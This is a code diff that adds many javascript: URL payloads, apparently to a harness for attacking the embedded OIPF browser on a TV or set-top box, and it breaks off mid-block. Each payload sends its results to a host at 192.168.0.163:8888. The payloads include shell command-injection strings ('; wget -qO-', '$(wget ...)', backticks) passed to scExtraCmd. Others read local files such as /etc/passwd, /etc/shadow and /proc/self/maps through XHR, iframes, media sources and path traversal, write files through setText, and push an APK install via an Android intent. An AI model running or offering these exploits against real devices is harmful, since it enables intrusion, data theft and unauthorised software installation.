+      if (name === 'jsconfiginjection') {
+        var configInjection = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?configInjection='+encodeURIComponent(s).substring(0,1800)+'&t='+Date.now()}var c=oipfObjectFactory.createConfigurationObject().configuration,f=c.scExtraCmd,base='http://192.168.0.163:8888/cmd-canary?case=',tests=[['id'],['cat /etc/hostname'],[';wget -qO- '+base+'semicolon'],['$(wget -qO- '+base+'dollar)'],['`wget -qO- '+base+'backtick`'],['help','id'],['help',';wget -qO- '+base+'arg2semicolon'],['help','$(wget -qO- '+base+'arg2dollar)']];for(var i=0;i<tests.length;i++){try{var r=f.apply(c,tests[i]);b('case'+i+';argc='+tests[i].length+';returnType='+typeof r+';value='+String(r))}catch(e){b('case'+i+';THROW:'+(e.name||'')+':'+(e.message||String(e)))}}setTimeout(function(){b('capture-finished')},10000)})()";
+        urls.jsconfiginjection = 'javascript:' + configInjection;
+      }
+      if (name === 'jsprivcallables') {
+        var privCallables = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?privCallables='+encodeURIComponent(s).substring(0,1800)+'&t='+Date.now()}function scan(label,o){try{if(!o){b(label+':NULL');return}var names=[],p=o,d=0;while(p&&d<8){var q=Object.getOwnPropertyNames(p);for(var i=0;i<q.length;i++)if(names.indexOf(q[i])<0)names.push(q[i]);p=Object.getPrototypeOf(p);d++}names.sort();var out=[];for(var j=0;j<names.length;j++){var n=names[j];if(n==='constructor'||n==='__proto__')continue;try{var v=o[n],s=n+':'+typeof v;if(typeof v==='function')s+='('+v.length+')';else if(v===null||typeof v==='string'||typeof v==='number'||typeof v==='boolean')s+='='+String(v).substring(0,120);out.push(s)}catch(e){out.push(n+':THROW:'+(e.name||''))}}for(var k=0;k<out.length;k+=14)b(label+';'+out.slice(k,k+14).join(','))}catch(e2){b(label+':SCAN_THROW:'+(e2.name||'')+':'+(e2.message||String(e2)))}}var f=oipfObjectFactory,c=f.createConfigurationObject(),m=f.createApplicationManagerObject(),o=m.getOwnerApplication(document),items=[['factory',f],['configurationObject',c],['configuration',c.configuration],['localSystem',c.localSystem],['applicationManager',m],['ownerApplication',o],['privateData',o.privateData]];var makers=[['capabilities','createCapabilitiesObject'],['drmAgent','createDrmAgentObject'],['parentalControl','createParentalControlManagerObject'],['recordingScheduler','createRecordingSchedulerObject'],['searchManager','createSearchManagerObject'],['videoBroadcast','createVideoBroadcastObject'],['videoMpeg','createVideoMpegObject'],['gatewayInfo','createGatewayInfoObject'],['downloadManager','createDownloadManagerObject'],['downloadTrigger','createDownloadTriggerObject']];for(var i=0;i<makers.length;i++){try{items.push([makers[i][0],f[makers[i][1]]()])}catch(z){b(makers[i][0]+':CREATE_THROW:'+(z.name||'')+':'+(z.message||String(z)))}}for(var j=0;j<items.length;j++)scan(items[j][0],items[j][1]);b('complete')})()";
+        urls.jsprivcallables = 'javascript:' + privCallables;
+      }
+      if (name === 'jsfactorydebug') {
+        var factoryDebug = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?factoryDebug='+encodeURIComponent(s).substring(0,1800)+'&t='+Date.now()}var f=oipfObjectFactory,d=f.debug;b('debug.type='+typeof d+';length='+d.length+';string='+String(d));var t=[[],[''],['help'],['?'],['version'],['test-marker'],['%s%s%s%s'],['id'],['cat /etc/hostname'],['test-marker','second']];for(var i=0;i<t.length;i++){try{var r=d.apply(f,t[i]);b('debug.case'+i+';argc='+t[i].length+';returnType='+typeof r+';value='+String(r))}catch(e){b('debug.case'+i+';THROW:'+(e.name||'')+':'+(e.message||String(e)))}}try{var c=f.createChannelConfig();b('channelConfig.type='+typeof c+';value='+String(c));if(c){var n=[],p=c,z=0;while(p&&z<6){var q=Object.getOwnPropertyNames(p);for(var j=0;j<q.length;j++)if(n.indexOf(q[j])<0)n.push(q[j]);p=Object.getPrototypeOf(p);z++}b('channelConfig.props='+n.sort().join(','))}}catch(e2){b('channelConfig.THROW:'+(e2.name||'')+':'+(e2.message||String(e2)))}b('complete')})()";
+        urls.jsfactorydebug = 'javascript:' + factoryDebug;
+      }
+      if (name === 'jschannelextra') {
+        var channelExtra = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?channelExtra='+encodeURIComponent(s).substring(0,1800)+'&t='+Date.now()}var c=oipfObjectFactory.createChannelConfig(),f=c.scExtraCmd,base='http://192.168.0.163:8888/channel-canary?case=',t=[[],[''],['help'],['?'],['version'],['list'],['id'],['cat /etc/hostname'],[';wget -qO- '+base+'semicolon'],['$(wget -qO- '+base+'dollar)'],['help','id'],['help',';wget -qO- '+base+'arg2']];b('type='+typeof f+';length='+f.length+';string='+String(f));for(var i=0;i<t.length;i++){try{var r=f.apply(c,t[i]);b('case'+i+';argc='+t[i].length+';returnType='+typeof r+';value='+String(r))}catch(e){b('case'+i+';THROW:'+(e.name||'')+':'+(e.message||String(e)))}}b('complete')})()";
+        urls.jschannelextra = 'javascript:' + channelExtra;
+      }
+      if (name === 'jsmpegsource') {
+        var mpegSource = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?mpegSource='+encodeURIComponent(s).substring(0,1800)+'&t='+Date.now()}var srcs=[['http-control','http://192.168.0.163:8888/test.mp4'],['file-hostname','file:///etc/hostname'],['file-cmdline','file:///proc/self/cmdline'],['data-text','data:text/plain,mpeg-scheme-canary'],['javascript','javascript:(function(){(new Image()).src=\"http://192.168.0.163:8888/mpeg-js-canary\"})()']];function one(i){var n=srcs[i][0],s=srcs[i][1],v;try{v=oipfObjectFactory.createVideoMpegObject();v.style.position='absolute';v.style.left='-10000px';v.style.width='1px';v.style.height='1px';v.onPlayStateChange=function(st){b(n+':playState='+st)};v.onerror=function(){b(n+':onerror;error='+v.error+';state='+v.playState)};document.body.appendChild(v);try{var r=v.setSource(s);b(n+':setSource.return='+typeof r+':'+String(r))}catch(e){b(n+':setSource.THROW:'+(e.name||'')+':'+(e.message||String(e)));try{v.data=s;b(n+':data.assigned='+v.data)}catch(e2){b(n+':data.THROW:'+(e2.name||'')+':'+(e2.message||String(e2)))}}try{var p=v.play(1);b(n+':play.return='+typeof p+':'+String(p))}catch(e3){b(n+':play.THROW:'+(e3.name||'')+':'+(e3.message||String(e3)))}setTimeout(function(){try{b(n+':final;data='+v.data+';state='+v.playState+';error='+v.error+';ready='+v.readyToPlay)}catch(z){}try{v.stop()}catch(z2){}try{document.body.removeChild(v)}catch(z3){}},7000+i*1000)}catch(e4){b(n+':CREATE_THROW:'+(e4.name||'')+':'+(e4.message||String(e4)))}}for(var i=0;i<srcs.length;i++)one(i);setTimeout(function(){b('complete')},15000)})()";
+        urls.jsmpegsource = 'javascript:' + mpegSource;
+      }
+      if (name === 'jsmpegfileoracle') {
+        var mpegFileOracle = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?mpegFileOracle='+encodeURIComponent(s).substring(0,1800)+'&t='+Date.now()}var srcs=[['http-control','http://192.168.0.163:8888/test.mp4'],['missing','file:///definitely/not/a/real/file-codex'],['hostname','file:///etc/hostname'],['passwd','file:///etc/passwd'],['proc-cmdline','file:///proc/self/cmdline'],['dev-null','file:///dev/null']],i=0;function next(){if(i>=srcs.length){b('complete');return}var n=srcs[i][0],s=srcs[i][1],v=oipfObjectFactory.createVideoMpegObject(),last='';v.style.position='absolute';v.style.left='-10000px';v.style.width='1px';v.style.height='1px';document.body.appendChild(v);function snap(tag){try{var z=tag+';state='+v.playState+';error='+v.error+';ready='+v.readyToPlay+';data='+v.data;if(z!==last){last=z;b(n+':'+z)}}catch(e){b(n+':snap.THROW:'+(e.message||String(e)))}}try{b(n+':setSource='+v.setSource(s));b(n+':play='+v.play(1))}catch(e2){b(n+':THROW:'+(e2.name||'')+':'+(e2.message||String(e2)))}snap('initial');var ticks=0,timer=setInterval(function(){ticks++;snap('poll'+ticks);if(ticks>=8){clearInterval(timer);snap('final');try{v.stop()}catch(z){}try{document.body.removeChild(v)}catch(z2){}i++;setTimeout(next,500)}},500)}next()})()";
+        urls.jsmpegfileoracle = 'javascript:' + mpegFileOracle;
+      }
+      if (name === 'jslocaltext') {
+        var localText = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?localText='+encodeURIComponent(s).substring(0,1800)+'&t='+Date.now()}var paths=['file:///etc/hostname','file:///etc/passwd'];for(var i=0;i<paths.length;i++){(function(p){try{var x=new XMLHttpRequest();x.onreadystatechange=function(){if(x.readyState===4){var t='';try{t=x.responseText}catch(z){t='READ_THROW:'+z}b('xhr:'+p+';status='+x.status+';length='+t.length+';text='+t.substring(0,800))}};x.onerror=function(){b('xhr:'+p+';onerror;status='+x.status)};x.open('GET',p,true);x.send();b('xhr:'+p+';sent')}catch(e){b('xhr:'+p+';THROW:'+(e.name||'')+':'+(e.message||String(e)))}try{var fr=document.createElement('iframe');fr.style.display='none';fr.onload=function(){try{var d=fr.contentDocument||fr.contentWindow.document,t=(d.body&&(d.body.innerText||d.body.textContent))||d.documentElement.textContent||'';b('iframe:'+p+';SUCCESS;length='+t.length+';text='+t.substring(0,800))}catch(z2){b('iframe:'+p+';READ_THROW:'+(z2.name||'')+':'+(z2.message||String(z2)))}};fr.onerror=function(){b('iframe:'+p+';onerror')};fr.src=p;document.body.appendChild(fr)}catch(e2){b('iframe:'+p+';THROW:'+(e2.name||'')+':'+(e2.message||String(e2)))}try{var o=document.createElement('object');o.type='text/plain';o.data=p;o.style.display='none';o.onload=function(){try{var d=o.contentDocument,t=(d&&d.documentElement&&d.documentElement.textContent)||'';b('object:'+p+';length='+t.length+';text='+t.substring(0,800))}catch(z3){b('object:'+p+';READ_THROW:'+(z3.name||'')+':'+(z3.message||String(z3)))}};o.onerror=function(){b('object:'+p+';onerror')};document.body.appendChild(o)}catch(e3){b('object:'+p+';THROW:'+(e3.name||'')+':'+(e3.message||String(e3)))}})(paths[i])}try{var v=document.createElement('video'),tr=document.createElement('track');tr.kind='subtitles';tr.src='file:///etc/passwd';tr.default=true;v.appendChild(tr);document.body.appendChild(v);tr.onload=function(){try{var q=tr.track.cues,a=[];for(var j=0;q&&j<q.length&&j<20;j++)a.push(q[j].text);b('track:loaded;readyState='+tr.readyState+';cues='+(q&&q.length)+';text='+a.join('|'))}catch(z4){b('track:READ_THROW:'+z4)}};tr.onerror=function(){b('track:onerror;readyState='+tr.readyState)};b('track:started')}catch(e4){b('track:THROW:'+(e4.name||'')+':'+(e4.message||String(e4)))}setTimeout(function(){b('complete')},15000)})()";
+        urls.jslocaltext = 'javascript:' + localText;
+      }
+      if (name === 'jsfilemap') {
+        var fileMap = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?fileMap='+encodeURIComponent(s).substring(0,1800)+'&t='+Date.now()}var p=['/etc/os-release','/etc/issue','/etc/passwd','/etc/shadow','/etc/hosts','/etc/resolv.conf','/proc/version','/proc/self/maps','/usr/bin/opera_omi','/usr/local/bin/opera_omi','/opt/opera/bin/opera_omi','/usr/bin/opera','/usr/bin/browser','/usr/lib/liboipf.so','/usr/lib/libomi.so','/lib/liboipf.so','/etc/init.d/opera','/etc/init.d/browser','/etc/opera.ini','/etc/opera/config.ini','/opt/opera/opera.ini','/var/log/messages','/var/log/opera.log','/mnt/config/config.xml'],i=0;function next(){if(i>=p.length){b('complete');return}var path=p[i++],v=oipfObjectFactory.createVideoMpegObject();v.style.position='absolute';v.style.left='-10000px';v.style.width='1px';v.style.height='1px';document.body.appendChild(v);try{v.setSource('file://'+path);v.play(1)}catch(e){b(path+';THROW:'+(e.name||'')+':'+(e.message||String(e)))}setTimeout(function(){try{b(path+';state='+v.playState+';error='+v.error)}catch(z){b(path+';READ_THROW:'+z)}try{v.stop()}catch(z2){}try{document.body.removeChild(v)}catch(z3){}setTimeout(next,150)},650)}next()})()";
+        urls.jsfilemap = 'javascript:' + fileMap;
+      }
+      if (name === 'jsfilechildread') {
+        var fileChildRead = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?fileChildRead='+encodeURIComponent(s).substring(0,1800)+'&t='+Date.now()}var m=oipfObjectFactory.createApplicationManagerObject(),o=m.getOwnerApplication(document),paths=['file:///etc/hostname','file:///etc/passwd','file:///usr/lib/liboipf.so'],apps=[];function inspect(n,a,tag){try{var r=[n+':'+tag,'app='+String(a)];try{r.push('visible='+a.visible)}catch(z){}try{r.push('active='+a.active)}catch(z2){}try{var w=a.window;r.push('windowType='+typeof w);r.push('window='+String(w));if(w){try{r.push('href='+w.location.href)}catch(z3){r.push('hrefThrow='+z3)}try{var d=w.document,t=(d.body&&(d.body.innerText||d.body.textContent))||(d.documentElement&&d.documentElement.textContent)||'';r.push('docURL='+d.URL);r.push('textLength='+t.length);r.push('text='+t.substring(0,1000))}catch(z4){r.push('docThrow='+(z4.name||'')+':'+(z4.message||String(z4)))}}}catch(z5){r.push('windowThrow='+(z5.name||'')+':'+(z5.message||String(z5)))}b(r.join(';'))}catch(e){b(n+':inspectThrow:'+(e.name||'')+':'+(e.message||String(e)))}}for(var i=0;i<paths.length;i++){try{var a=o.createApplication(paths[i],true);apps.push([paths[i],a]);inspect(paths[i],a,'immediate')}catch(e){b(paths[i]+':createThrow:'+(e.name||'')+':'+(e.message||String(e)))}}setTimeout(function(){for(var j=0;j<apps.length;j++){inspect(apps[j][0],apps[j][1],'delayed');try{apps[j][1].destroyApplication()}catch(z){}}try{var q=m.getChildApplications(document);b('childrenAfter='+String(q)+';length='+(q&&q.length))}catch(z2){b('childrenThrow='+(z2.name||'')+':'+(z2.message||String(z2)))}b('complete')},8000)})()";
+        urls.jsfilechildread = 'javascript:' + fileChildRead;
+      }
+      if (name === 'jsfilechildevent') {
+        var fileChildEvent = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?fileChildEvent='+encodeURIComponent(s).substring(0,1800)+'&t='+Date.now()}function inspect(label,a){try{var r=[label,'type='+typeof a,'value='+String(a)];if(a){var n=[],p=a,d=0;while(p&&d<6){var q=Object.getOwnPropertyNames(p);for(var i=0;i<q.length;i++)if(n.indexOf(q[i])<0)n.push(q[i]);p=Object.getPrototypeOf(p);d++}r.push('props='+n.sort().join(','));try{r.push('visible='+a.visible+';active='+a.active)}catch(z){}try{var w=a.window;r.push('windowType='+typeof w);if(w){r.push('href='+w.location.href);var x=(w.document.body&&(w.document.body.innerText||w.document.body.textContent))||'';r.push('textLength='+x.length+';text='+x.substring(0,1000))}}catch(z2){r.push('windowThrow='+(z2.name||'')+':'+(z2.message||String(z2)))}}b(r.join(';'))}catch(e){b(label+':inspectThrow:'+(e.name||'')+':'+(e.message||String(e)))}}var m=oipfObjectFactory.createApplicationManagerObject(),o=m.getOwnerApplication(document),child;function loaded(){b('loadedCallback;argc='+arguments.length);for(var i=0;i<arguments.length;i++)inspect('loaded.arg'+i,arguments[i]);inspect('loaded.child',child)}m.onApplicationLoaded=loaded;try{m.addEventListener('ApplicationLoaded',loaded);b('listener=accepted')}catch(e){b('listenerThrow='+(e.name||'')+':'+(e.message||String(e)))}try{child=o.createApplication('file:///etc/hostname',true);inspect('immediate.child',child)}catch(e2){b('createThrow='+(e2.name||'')+':'+(e2.message||String(e2)))}function children(tag){try{var c=m.getChildApplications(document),r=[tag,'type='+typeof c,'value='+String(c)];try{r.push('length='+c.length)}catch(z){}b(r.join(';'));try{for(var i=0;i<c.length;i++)inspect(tag+'.item'+i,c.item?c.item(i):c[i])}catch(z2){b(tag+'.iterateThrow='+z2)}}catch(e){b(tag+':childrenThrow='+(e.name||'')+':'+(e.message||String(e)))}}children('immediate.children');setTimeout(function(){inspect('delayed.child',child);children('delayed.children');b('complete')},10000)})()";
+        urls.jsfilechildevent = 'javascript:' + fileChildEvent;
+      }
+      if (name === 'jschildrenowner') {
+        var childrenOwner = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?childrenOwner='+encodeURIComponent(s).substring(0,1800)+'&t='+Date.now()}var m=oipfObjectFactory.createApplicationManagerObject(),o=m.getOwnerApplication(document),child;function val(n,f){try{var v=f();b(n+':returnType='+typeof v+';value='+String(v));return v}catch(e){b(n+':THROW:'+(e.name||'')+':'+(e.message||String(e)))}}function list(n,c){try{var r=[n,'type='+typeof c,'value='+String(c)],len;try{len=c.length;r.push('length='+len)}catch(z){r.push('lengthThrow='+z)}b(r.join(';'));if(typeof len==='number'){for(var i=0;i<len;i++){try{var a=c.item?c.item(i):c[i],x=[n+'.item'+i,'type='+typeof a,'value='+String(a)];try{x.push('visible='+a.visible+';active='+a.active+';primary='+a.isPrimaryReceiver)}catch(z2){x.push('stateThrow='+z2)}try{x.push('windowType='+typeof a.window)}catch(z3){x.push('windowThrow='+(z3.name||'')+':'+(z3.message||String(z3)))}b(x.join(';'))}catch(z4){b(n+'.item'+i+':THROW:'+(z4.name||'')+':'+(z4.message||String(z4)))}}}}catch(e){b(n+':listThrow:'+(e.name||'')+':'+(e.message||String(e)))}}val('owner',function(){return o});child=val('create',function(){return o.createApplication('file:///etc/hostname',true)});list('noargs',val('get.noargs',function(){return m.getChildApplications()}));list('ownerarg',val('get.owner',function(){return m.getChildApplications(o)}));list('childarg',val('get.child',function(){return m.getChildApplications(child)}));list('nullarg',val('get.null',function(){return m.getChildApplications(null)}));setTimeout(function(){list('delayed.ownerarg',val('delayed.get.owner',function(){return m.getChildApplications(o)}));b('complete')},8000)})()";
+        urls.jschildrenowner = 'javascript:' + childrenOwner;
+      }
+      if (name === 'jsgettext') {
+        var getTextProbe = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?getTextProbe='+encodeURIComponent(s).substring(0,1800)+'&t='+Date.now()}var c=oipfObjectFactory.createConfigurationObject().configuration,f=c.getText;b('type='+typeof f+';length='+f.length+';string='+String(f));var t=[[],[''],['help'],['version'],['language'],['menu'],['../etc/hostname'],['../../etc/hostname'],['../../../etc/passwd'],['/etc/hostname'],['/etc/passwd'],['file:///etc/hostname'],['file:///etc/passwd'],['..\\..\\etc\\passwd'],['%2e%2e/%2e%2e/etc/passwd'],[null],[0],[{}]];for(var i=0;i<t.length;i++){try{var r=f.apply(c,t[i]),s=String(r);b('case'+i+';arg='+String(t[i][0])+';returnType='+typeof r+';length='+s.length+';value='+s.substring(0,1200))}catch(e){b('case'+i+';arg='+String(t[i][0])+';THROW:'+(e.name||'')+':'+(e.message||String(e)))}}b('complete')})()";
+        urls.jsgettext = 'javascript:' + getTextProbe;
+      }
+      if (name === 'jsvideoextra') {
+        var videoExtra = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?videoExtra='+encodeURIComponent(s).substring(0,1800)+'&t='+Date.now()}var f=oipfObjectFactory,targets=[];try{targets.push(['mpeg',f.createVideoMpegObject()])}catch(e){b('mpeg.createThrow='+e)}try{targets.push(['broadcast',f.createVideoBroadcastObject()])}catch(e2){b('broadcast.createThrow='+e2)}var base='http://192.168.0.163:8888/video-canary?case=',tests=[[],[''],['help'],['?'],['version'],['list'],['getPosition'],['getStatus'],['getSubtitles'],['subtitle','file:///etc/passwd'],['id'],['cat /etc/hostname'],[';wget -qO- '+base+'semicolon'],['$(wget -qO- '+base+'dollar)'],['help','id'],['help',';wget -qO- '+base+'arg2']];for(var j=0;j<targets.length;j++){var n=targets[j][0],o=targets[j][1],x=o.scExtraCmd;b(n+':type='+typeof x+';length='+x.length+';string='+String(x));for(var i=0;i<tests.length;i++){try{var r=x.apply(o,tests[i]),s=String(r);b(n+'.case'+i+';args='+tests[i].join('|')+';returnType='+typeof r+';length='+s.length+';value='+s.substring(0,1000))}catch(e3){b(n+'.case'+i+';args='+tests[i].join('|')+';THROW:'+(e3.name||'')+':'+(e3.message||String(e3)))}}}b('complete')})()";
+        urls.jsvideoextra = 'javascript:' + videoExtra;
+      }
+      if (name === 'jssettext') {
+        var setTextProbe = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?setTextProbe='+encodeURIComponent(s).substring(0,1800)+'&t='+Date.now()}var c=oipfObjectFactory.createConfigurationObject().configuration,s=c.setText,g=c.getText,key='codex_probe_179074',value='CODEX_TEXT_CANARY_8f31',path='/tmp/codex-oipf-canary';b('set.type='+typeof s+';length='+s.length+';get.type='+typeof g+';get.length='+g.length);function call(n,a){try{var r=s.apply(c,a);b(n+':returnType='+typeof r+';value='+String(r))}catch(e){b(n+':THROW:'+(e.name||'')+':'+(e.message||String(e)))}}call('none',[]);call('one',[key]);call('normal',[key,value]);try{var r=g(key);b('normal.get:type='+typeof r+';length='+String(r).length+';value='+String(r))}catch(e){b('normal.get.THROW='+e)}call('absolute',[path,value]);call('traversal',['../../tmp/codex-oipf-canary',value]);call('fileurl',['file:///tmp/codex-oipf-canary',value]);setTimeout(function(){var v=oipfObjectFactory.createVideoMpegObject();v.style.position='absolute';v.style.left='-10000px';v.style.width='1px';v.style.height='1px';document.body.appendChild(v);try{b('oracle.setSource='+v.setSource('file:///tmp/codex-oipf-canary'));b('oracle.play='+v.play(1))}catch(e2){b('oracle.THROW:'+(e2.name||'')+':'+(e2.message||String(e2)))}setTimeout(function(){b('oracle.state='+v.playState+';error='+v.error);try{v.stop()}catch(z){}try{document.body.removeChild(v)}catch(z2){}b('complete')},1500)},500)})()";
+        urls.jssettext = 'javascript:' + setTextProbe;
+      }
+      if (name === 'jsxhrbinary') {
+        var xhrBinary = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?xhrBinary='+encodeURIComponent(s).substring(0,1800)+'&t='+Date.now()}var url='file:///etc/hostname';function dump(x){try{var q=new Uint8Array(x||new ArrayBuffer(0)),h='',a='';for(var i=0;i<q.length&&i<512;i++){h+=('0'+q[i].toString(16)).slice(-2);a+=q[i]>=32&&q[i]<127?String.fromCharCode(q[i]):'.'}return 'len='+q.length+';hex='+h+';ascii='+a}catch(e){return 'dumpThrow='+e}}function asyncType(type,mime){try{var x=new XMLHttpRequest();x.open('GET',url,true);if(mime)x.overrideMimeType(mime);if(type)x.responseType=type;x.onload=function(){var r='';try{r='responseType='+x.responseType+';status='+x.status+';headers='+x.getAllResponseHeaders()+';textLen='+(x.responseText&&x.responseText.length)}catch(z){r+=';metaThrow='+z}try{if(x.response instanceof ArrayBuffer)r+=';buffer='+dump(x.response);else r+=';response='+String(x.response).substring(0,500)}catch(z2){r+=';responseThrow='+z2}b('async.'+(type||'text')+':'+r);try{if(x.response&&typeof FileReader!=='undefined'&&type==='blob'){var f=new FileReader();f.onload=function(){b('blob.reader='+dump(f.result))};f.onerror=function(){b('blob.readerError='+f.error)};f.readAsArrayBuffer(x.response)}}catch(z3){b('blob.readerThrow='+z3)}};x.onerror=function(){b('async.'+(type||'text')+':onerror;status='+x.status)};x.send();b('async.'+(type||'text')+':sent')}catch(e){b('async.'+(type||'text')+':THROW:'+(e.name||'')+':'+(e.message||String(e)))}}asyncType('', 'text/plain; charset=x-user-defined');asyncType('arraybuffer');asyncType('blob');asyncType('document');try{var s=new XMLHttpRequest();s.open('GET',url,false);s.overrideMimeType('text/plain; charset=x-user-defined');s.send();var t=s.responseText||'';b('sync:status='+s.status+';headers='+s.getAllResponseHeaders()+';length='+t.length+';text='+t.substring(0,800))}catch(e2){b('sync:THROW:'+(e2.name||'')+':'+(e2.message||String(e2)))}setTimeout(function(){b('complete')},10000)})()";
+        urls.jsxhrbinary = 'javascript:' + xhrBinary;
+      }
+      if (name === 'jsapkinstall') {
+        var apkInstall = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?apkInstall='+encodeURIComponent(s).substring(0,1800)+'&t='+Date.now()}var apk='http://192.168.0.163:8888/probe.apk',intent='intent://192.168.0.163:8888/probe.apk#Intent;scheme=http;action=android.intent.action.VIEW;type=application/vnd.android.package-archive;S.browser_fallback_url='+encodeURIComponent(apk)+';end',m=oipfObjectFactory.createApplicationManagerObject(),o=m.getOwnerApplication(document);b('intent='+intent);try{var a=o.createApplication(intent,true);b('createApplication:returnType='+typeof a+';value='+String(a))}catch(e){b('createApplication:THROW:'+(e.name||'')+':'+(e.message||String(e)))}setTimeout(function(){b('navigating-intent');try{location.href=intent}catch(e2){b('location:THROW:'+(e2.name||'')+':'+(e2.message||String(e2)))}} ,1500)})()";
+        urls.jsapkinstall = 'javascript:' + apkInstall;
+      }
+      if (name === 'jsapkdirect') {
+        var apkDirect = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?apkDirect='+encodeURIComponent(s).substring(0,1800)+'&t='+Date.now()}var apk='http://192.168.0.163:8888/probe.apk',m=oipfObjectFactory.createApplicationManagerObject(),o=m.getOwnerApplication(document);b('starting;url='+apk);try{var a=o.createApplication(apk,true);b('createApplication:returnType='+typeof a+';value='+String(a))}catch(e){b('createApplication:THROW:'+(e.name||'')+':'+(e.message||String(e)))}setTimeout(function(){b('capture-finished')},10000)})()";
+        urls.jsapkdirect = 'javascript:' + apkDirect;
+      }
+      if (name === 'jsapkdownload') {
+        var apkDownload = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?apkDownload='+encodeURIComponent(s).substring(0,1800)+'&t='+Date.now()}var u='http://192.168.0.163:8888/probe-download.apk';b('starting;url='+u);try{var a=document.createElement('a');a.href=u;a.download='probe.apk';a.type='application/vnd.android.package-archive';a.style.display='none';document.body.appendChild(a);a.click();b('anchor-clicked')}catch(e){b('anchor:THROW:'+(e.name||'')+':'+(e.message||String(e)))}setTimeout(function(){b('capture-finished')},10000)})()";
+        urls.jsapkdownload = 'javascript:' + apkDownload;
+      }
+      if (name === 'jslifecyclediff') {
+        var lifecycleDiff = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?lifecycleDiff='+encodeURIComponent(s).substring(0,1800)+'&t='+Date.now()}var m=oipfObjectFactory.createApplicationManagerObject(),o=m.getOwnerApplication(document),tests=[['http','http://192.168.0.163:8888/bridge-child.html'],['file-existing','file:///etc/hostname'],['file-missing','file:///definitely-not-present-codex-64'],['unsupported','codex-invalid-scheme://probe']],i=0,current=null;function inspect(tag,a){var r=[tag];try{r.push('type='+typeof a,'value='+String(a))}catch(z){}if(a){try{r.push('visible='+a.visible)}catch(z1){r.push('visibleThrow='+z1)}try{r.push('active='+a.active)}catch(z2){r.push('activeThrow='+z2)}try{r.push('primary='+a.isPrimaryReceiver)}catch(z3){r.push('primaryThrow='+z3)}try{r.push('windowType='+typeof a.window)}catch(z4){r.push('windowThrow='+(z4.name||'')+':'+(z4.message||String(z4)))}}b(r.join(';'))}function children(tag){try{var c=m.getChildApplications(o),r=[tag,'value='+String(c)];try{r.push('length='+c.length)}catch(z){}b(r.join(';'))}catch(e){b(tag+';THROW:'+(e.name||'')+':'+(e.message||String(e)))}}function event(label){return function(){var r=[label,'argc='+arguments.length];for(var j=0;j<arguments.length;j++){try{r.push('arg'+j+'='+String(arguments[j]))}catch(z){}}b(r.join(';'))}}try{m.onApplicationLoaded=event('onApplicationLoaded');m.onApplicationUnloaded=event('onApplicationUnloaded');m.onApplicationLoadError=event('onApplicationLoadError')}catch(e){b('handlerAssignThrow='+e)}function next(){if(current){try{current.destroyApplication();b('destroyed:'+tests[i-1][0])}catch(z){b('destroyThrow:'+z)}current=null}if(i>=tests.length){children('final.children');b('complete');return}var q=tests[i++];b('begin:'+q[0]+';uri='+q[1]);try{current=o.createApplication(q[1],false);inspect(q[0]+'.immediate',current)}catch(e){b(q[0]+'.createThrow:'+(e.name||'')+':'+(e.message||String(e)))}children(q[0]+'.immediate.children');setTimeout(function(){inspect(q[0]+'.delayed',current);children(q[0]+'.delayed.children');next()},3500)}next()})()";
+        urls.jslifecyclediff = 'javascript:' + lifecycleDiff;
+      }
+      if (name === 'jsfileexistingonly' || name === 'jsfilemissingonly') {
+        var fileLabel = name === 'jsfileexistingonly' ? 'existing' : 'missing';
+        var fileUri = name === 'jsfileexistingonly' ? 'file:///etc/hostname' : 'file:///definitely-not-present-codex-66';
+        var fileOnly = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?fileOnly=" + fileLabel + "%3B'+encodeURIComponent(s).substring(0,1600)+'&t='+Date.now()}var uri='" + fileUri + "',m=oipfObjectFactory.createApplicationManagerObject(),o=m.getOwnerApplication(document),a=null;function ev(n){return function(){var r=[n,'argc='+arguments.length];for(var i=0;i<arguments.length;i++){try{r.push('arg'+i+'='+String(arguments[i]))}catch(z){}}b(r.join(';'))}}try{m.onApplicationLoaded=ev('loaded');m.onApplicationUnloaded=ev('unloaded');m.onApplicationLoadError=ev('loadError')}catch(e){b('handlerThrow='+(e.message||String(e)))}b('before;uri='+uri);try{a=o.createApplication(uri,false);b('returned;type='+typeof a+';value='+String(a));try{b('immediate;visible='+a.visible+';active='+a.active+';windowType='+typeof a.window)}catch(z2){b('immediateInspectThrow='+(z2.name||'')+':'+(z2.message||String(z2)))} }catch(e2){b('createThrow='+(e2.name||'')+':'+(e2.message||String(e2)))}setTimeout(function(){b('timer-2s');try{b('delayed;visible='+a.visible+';active='+a.active+';windowType='+typeof a.window)}catch(z3){b('delayedInspectThrow='+(z3.name||'')+':'+(z3.message||String(z3))) }},2000);setTimeout(function(){b('timer-8s;complete')},8000)})()";
+        urls[name] = 'javascript:' + fileOnly;
+      }
+      if (name === 'jsfileerrordetail') {
